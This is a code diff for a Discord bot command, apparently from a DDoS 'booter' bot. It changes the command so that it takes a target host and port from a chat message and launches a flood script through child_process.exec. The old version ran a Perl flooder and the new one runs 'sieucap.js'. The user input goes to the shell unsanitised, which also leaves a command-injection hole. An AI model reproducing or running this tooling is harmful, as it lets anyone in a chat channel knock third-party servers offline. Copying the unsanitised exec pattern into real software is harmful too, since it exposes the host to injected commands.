@@ -4,7 +4,6 @@ exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const port = message.content.split (" ")[2]
-const duration = message.content.split (" ")[3]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -17,7 +16,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;home 1.1.1.1 80 60`")
+	.setDescription("`Ex ;cap 1.1.1.1 duration`")
 	.setFooter("Please do not attack government server!")
 	message.channel.send(embed1);
 	return;
@@ -25,7 +24,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`perl home.pl ${host} ${port} 65500 ${duration}`, (error, stdout, stderr) => {
+exec(`node sieucap.js ${host} ${port}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -70,12 +69,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['home'],
+  aliases: ['cap'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'home',
+  name: 'cap',
   description: 'zxcr9999',
-  usage: 'home'
+  usage: 'cap'
 }
